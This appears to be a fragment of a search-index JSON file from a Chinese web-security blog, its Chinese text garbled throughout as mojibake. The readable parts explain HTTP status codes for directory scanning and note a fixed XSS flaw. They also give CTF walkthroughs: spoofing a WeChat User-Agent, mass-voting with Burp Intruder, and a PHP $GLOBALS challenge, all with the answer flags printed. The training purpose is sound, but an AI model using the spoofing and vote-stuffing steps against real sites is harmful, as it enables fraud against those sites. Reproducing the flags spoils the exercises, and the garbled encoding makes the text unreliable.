ç©ºè¡Œï¼šå“åº”å¤´ä¸å“åº”ä½“ä¹‹é—´ç”¨ç©ºè¡Œéš”å¼€ å“åº”æ•°æ®ï¼šæµè§ˆå™¨ä¼šå°†å®ä½“å†…å®¹ä¸­çš„æ•°æ®å–å‡ºæ¥ï¼Œç”Ÿæˆç›¸åº”çš„é¡µé¢ HTTP å“åº”ç ï¼š 1xxï¼šä¿¡æ¯ï¼Œè¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç† 2xxï¼šæˆåŠŸï¼Œè¡Œä¸ºè¢«æˆåŠŸåœ°æ¥å—ã€ç†è§£å’Œé‡‡çº³ 3xxï¼šé‡å®šå‘ï¼Œä¸ºäº†å®Œæˆè¯·æ±‚ï¼Œå¿…é¡»è¿›ä¸€æ­¥æ‰§è¡Œçš„åŠ¨ä½œ 4xxï¼šå®¢æˆ·ç«¯é”™è¯¯ 5xxï¼šæœåŠ¡å™¨é”™è¯¯ åˆ¤æ–­æ–‡ä»¶ï¼ˆå¤¹ï¼‰æ˜¯å¦å­˜åœ¨ 200 å­˜åœ¨æ–‡ä»¶ 3xx å‡å¯èƒ½å­˜åœ¨ 403 å­˜åœ¨æ–‡ä»¶å¤¹ 404 ä¸å­˜åœ¨æ–‡ä»¶åŠæ–‡ä»¶å¤¹ 500 å‡å¯èƒ½å­˜åœ¨ å› æ­¤åœ¨æ‰«æç½‘ç«™åå°æ—¶æœ€å¥½è¿™ä¸‰ä¸ªé€‰é¡¹éƒ½é€‰ä¸Š å“åº”å¤´æ ‡ï¼šåƒè¯·æ±‚å¤´æ ‡ä¸€æ ·ï¼Œå®ƒä»¬æŒ‡å‡ºæœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œæ ‡è¯†å‡ºå“åº”æ•°æ®çš„ç»†èŠ‚ ç©ºè¡Œï¼šæœ€åä¸€ä¸ªå“åº”å¤´æ ‡ä¹‹åæ˜¯ä¸€ä¸ªç©ºè¡Œï¼Œå‘é€å›è½¦ç¬¦å’Œé€€è¡Œï¼Œè¡¨æ˜æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡ å“åº”æ•°æ®ï¼šHTMLæ–‡æ¡£å’Œå›¾åƒç­‰ï¼Œä¹Ÿå°±æ˜¯HTMLæœ¬èº« å…­ã€ä¾‹å­6.1 ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»&emsp;&emsp;ä¹‹å‰æŸé•¿ä¹‹å®¶çš„IPæŸ¥è¯¢åŠŸèƒ½é¡µé¢ï¼Œå› ä¸ºä¼šé€šè¿‡æ•°æ®åŒ…è·å–User-Agentä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œè€Œæ²¡æœ‰é‡‡å–é˜²å¾¡æªæ–½ï¼Œå› æ­¤æœ‰XSSæ¼æ´ï¼Œç›®å‰å·²ä¿®å¤ 6.2 CTFæˆ–å®é™…åº”ç”¨ä¸­éƒ¨åˆ†è€ƒé¢˜è§£æï¼ˆmozheï¼‰6.2.1 æµè§ˆå™¨ä¿¡æ¯ä¼ªé€ &emsp;&emsp;èƒŒæ™¯ä»‹ç»ï¼šå°å¢¨äº†è§£åˆ°ä»å¾®ä¿¡6.0å¼€å§‹ï¼Œå…¶å†…åµŒçš„æµè§ˆå™¨åœ¨User Agentå­—ç¬¦ä¸²ä¸­å¢åŠ äº†NetTypeå­—æ®µç”¨äºæ ‡è¯†å®¢æˆ·ç«¯ï¼ˆæ‰‹æœºï¼‰å½“å‰çš„ç½‘ç»œç¯å¢ƒï¼Œå¢åŠ ä¹‹åçœŸçš„å®‰å…¨å—ï¼Ÿ &emsp;&emsp;è§£é¢˜æ–¹å‘ï¼š æ ¹æ®é¡µé¢æç¤ºï¼ŒæŠ“åŒ…åˆ†æé™¤äº†åˆ¤æ–­æµè§ˆå™¨ç±»å‹è¿˜åˆ¤æ–­äº†å¾®ä¿¡ç‰¹æœ‰çš„NetType &emsp;&emsp;æŸ¥é˜…èµ„æ–™å‘ç°ç¬¦åˆçš„User-Agentï¼š Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G &emsp;&emsp;KEYï¼š mozhe1540417e23d339b162b1bbe84c9 6.2.2 æŠ•ç¥¨å¸¸è§æ¼æ´åˆ†ææº¯æº &emsp;&emsp;éšä¾¿æŠ•ä¸€ç¥¨ï¼Œå‘ç°è¯´è¦å¾®ä¿¡æ‰“å¼€ &emsp;&emsp;æŸ¥é˜…èµ„æ–™çŸ¥é“å¾®ä¿¡çš„User-agentæœ‰ï¼š Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2C Build/LRX22G) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.53_r2565f18.621 NetType/WIFI Language/zh_CN &emsp;&emsp;ä½¿ç”¨å¾®ä¿¡çš„User-Agentåï¼ŒæŠ•ç¥¨æˆåŠŸ &emsp;&emsp;ä½¿ç”¨Repeaterå†æ¬¡è¿›è¡Œä¸€éï¼Œæ— è¯¯ &emsp;&emsp;ä½¿ç”¨Intruderç–¯ç‹‚æŠ•ç¥¨å§ï¼ &emsp;&emsp;å·®ä¸å¤šå°±å¯ä»¥åœäº†ï¼ŒKEYï¼šmozhece264154fdee3bfe3040b0c3ba1 6.2.3 æ¥æºé¡µä¼ªé€ ","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Bugku-Web-å˜é‡1","slug":"Bugku-Web-å˜é‡1","date":"2021-12-02T16:35:56.000Z","updated":"2022-01-03T03:25:36.065Z","comments":true,"path":"post/55589c6e.html","link":"","permalink":"https://wolke.cn/post/55589c6e.html","excerpt":"","text":"ä¸€ã€è€ƒå¯Ÿæ–¹å‘ PHPçš„$GLOBALS æ­£åˆ™è¡¨è¾¾å¼ äºŒã€PHPé¢„å¤‡çŸ¥è¯†â€”â€”$GLOBALS&emsp;&emsp;å…¶ä¸­æç¤ºflagåœ¨å˜é‡ä¸­ â€œflag In the variable !â€ ï¼Œè¿™é‡Œè¦æ™®åŠä¸€ä¸ªPHPä¸­ç‰¹æ®Šçš„å˜é‡ &emsp;&emsp;$GLOBALS â€”â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚ &emsp;&emsp;è¯´æ˜ï¼šä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ &emsp;&emsp;ç¤ºä¾‹ï¼š #ç¤ºä¾‹ä»£ç &lt;?phpfunction test() &#123; $foo = &quot;local variable&quot;; echo &#x27;$foo in global scope: &#x27; . $GLOBALS[&quot;foo&quot;] . &quot;\\n&quot;; echo &#x27;$foo in current scope: &#x27; . $foo . &quot;\\n&quot;;&#125;$foo = &quot;Example content&quot;;test();?&gt; #ç»“æœ$foo in global scope: Example content$foo in current scope: local variable &emsp;&emsp;æ³¨æ„ï¼š â€œSuperglobalâ€ä¹Ÿç§°ä¸ºè‡ªåŠ¨åŒ–çš„å…¨å±€å˜é‡ã€‚è¿™å°±è¡¨ç¤ºå…¶åœ¨è„šæœ¬çš„æ‰€æœ‰ä½œç”¨åŸŸä¸­éƒ½æ˜¯å¯ç”¨çš„ã€‚ä¸éœ€è¦åœ¨å‡½æ•°æˆ–æ–¹æ³•ä¸­ç”¨ global $variable; æ¥è®¿é—®å®ƒã€‚ å˜é‡å¯ç”¨æ€§ã€‚ä¸æ‰€æœ‰å…¶ä»–è¶…å…¨å±€å˜é‡ä¸åŒï¼Œ$GLOBALSåœ¨PHPä¸­æ€»æ˜¯å¯ç”¨çš„ã€‚ ä¸‰ã€ä»£ç åˆ†æ&emsp;&emsp;é¡µé¢å¦‚ä¸‹ &emsp;&emsp;å…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼/^\\w+$/ï¼Œæ„æ€æ˜¯åªèƒ½æœ‰å­—æ¯å’Œæ•°å­— ä¸¤ä¸ª//è¡¨ç¤ºå¼€å§‹å’Œç»“æŸ ^è¡¨ç¤ºå¼€å§‹å­—ç¬¦ä¸² $è¡¨ç¤ºç»“æŸå­—ç¬¦ä¸² \\wè¡¨ç¤ºåŒ…å«ã€a-zï¼ŒA-Z, _ , 0-9ã€‘ +è¡¨ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ª\\w åé¢çš„iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œåœ¨æ­¤å¤„æ²¡ç”¨ï¼Œå› ä¸º\\wé‡Œå·²ç»åŒ…å«äº†å¤§å°å†™ã€‚ å››ã€è§£é¢˜&emsp;&emsp;è®¿é—®http://114.67.246.176:12610/?args=GLOBALSï¼Œçœ‹åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://wolke.cn/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"}],"author":"w01ke"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"Go","slug":"Go","permalink":"https://wolke.cn/categories/Go/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"},{"name":"è–…ç¾Šæ¯›","slug":"è–…ç¾Šæ¯›","permalink":"https://wolke.cn/categories/%E8%96%85%E7%BE%8A%E6%AF%9B/"},{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://wolke.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"APT/ç¤¾å·¥","slug":"APT-ç¤¾å·¥","permalink":"https://wolke.cn/categories/APT-%E7%A4%BE%E5%B7%A5/"},{"name":"æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ ","permalink":"https://wolke.cn/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/categories/PHP/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"},{"name":"ç§»åŠ¨å®‰å…¨","slug":"ç§»åŠ¨å®‰å…¨","permalink":"https://wolke.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"æ–¹å‘é¶åœº","slug":"æ–¹å‘é¶åœº","permalink":"https://wolke.cn/categories/%E6%96%B9%E5%90%91%E9%9D%B6%E5%9C%BA/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/categories/CTF/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"Go","slug":"Go","permalink":"https://wolke.cn/tags/Go/"},{"name":"Nexus","slug":"Nexus","permalink":"https://wolke.cn/tags/Nexus/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://wolke.cn/tags/SpringBoot/"},{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"è–…ç¾Šæ¯›","slug":"è–…ç¾Šæ¯›","permalink":"https://wolke.cn/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://wolke.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"å­åŸŸåçˆ†ç ´","slug":"å­åŸŸåçˆ†ç ´","permalink":"https://wolke.cn/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://wolke.cn/tags/BurpSuite/"},{"name":"å¾®ä¿¡å°ç¨‹åº","slug":"å¾®ä¿¡å°ç¨‹åº","permalink":"https://wolke.cn/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"Ueditor","slug":"Ueditor","permalink":"https://wolke.cn/tags/Ueditor/"},{"name":".NET","slug":"NET","permalink":"https://wolke.cn/tags/NET/"},{"name":"Hikvison","slug":"Hikvison","permalink":"https://wolke.cn/tags/Hikvison/"},{"name":"DNSlog","slug":"DNSlog","permalink":"https://wolke.cn/tags/DNSlog/"},{"name":"éªŒè¯ç ","slug":"éªŒè¯ç ","permalink":"https://wolke.cn/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://wolke.cn/tags/OpenSSL/"},{"name":"Kali","slug":"Kali","permalink":"https://wolke.cn/tags/Kali/"},{"name":"phpMyAdmin","slug":"phpMyAdmin","permalink":"https://wolke.cn/tags/phpMyAdmin/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQæŠ€æœ¯","slug":"QQæŠ€æœ¯","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"},{"name":"ä¸­é—´ä»¶æ¼æ´","slug":"ä¸­é—´ä»¶æ¼æ´","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"IIS","slug":"IIS","permalink":"https://wolke.cn/tags/IIS/"},{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"æ—¥å¿—åˆ†æ","slug":"æ—¥å¿—åˆ†æ","permalink":"https://wolke.cn/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://wolke.cn/tags/%E9%80%86%E5%90%91/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://wolke.cn/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"},{"name":"CMS","slug":"CMS","permalink":"https://wolke.cn/tags/CMS/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://wolke.cn/tags/CobaltStrike/"},{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"},{"name":"Redis","slug":"Redis","permalink":"https://wolke.cn/tags/Redis/"},{"name":"å†…ç½‘å®‰å…¨","slug":"å†…ç½‘å®‰å…¨","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"},{"name":"Xray","slug":"Xray","permalink":"https://wolke.cn/tags/Xray/"},{"name":"æ¼æ´æ‰«æ","slug":"æ¼æ´æ‰«æ","permalink":"https://wolke.cn/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"name":"RCE","slug":"RCE","permalink":"https://wolke.cn/tags/RCE/"},{"name":"ä¸­é—´ä»¶","slug":"ä¸­é—´ä»¶","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"SSRF","slug":"SSRF","permalink":"https://wolke.cn/tags/SSRF/"},{"name":"XSS","slug":"XSS","permalink":"https://wolke.cn/tags/XSS/"},{"name":"æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ ","permalink":"https://wolke.cn/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"SMB","slug":"SMB","permalink":"https://wolke.cn/tags/SMB/"},{"name":"UQCMS","slug":"UQCMS","permalink":"https://wolke.cn/tags/UQCMS/"},{"name":"FTP","slug":"FTP","permalink":"https://wolke.cn/tags/FTP/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"https://wolke.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"ç§»åŠ¨å®‰å…¨","slug":"ç§»åŠ¨å®‰å…¨","permalink":"https://wolke.cn/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"Android","slug":"Android","permalink":"https://wolke.cn/tags/Android/"},{"name":"sqlilabs","slug":"sqlilabs","permalink":"https://wolke.cn/tags/sqlilabs/"},{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://wolke.cn/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"Web","slug":"Web","permalink":"https://wolke.cn/tags/Web/"}]}